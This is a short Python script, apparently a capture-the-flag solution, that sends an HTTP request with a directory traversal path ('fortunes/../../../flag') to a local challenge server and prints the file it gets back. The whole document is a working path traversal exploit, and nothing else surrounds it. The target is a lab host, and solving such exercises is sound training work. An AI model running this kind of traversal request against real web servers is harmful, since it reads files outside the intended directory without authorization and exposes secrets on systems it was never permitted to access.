#!/usr/bin/env python3

import requests
url = "http://challenge.localhost/filebank/fortunes/../../../flag"


response = requests.get(url)

print(f"Got this {response.content}")
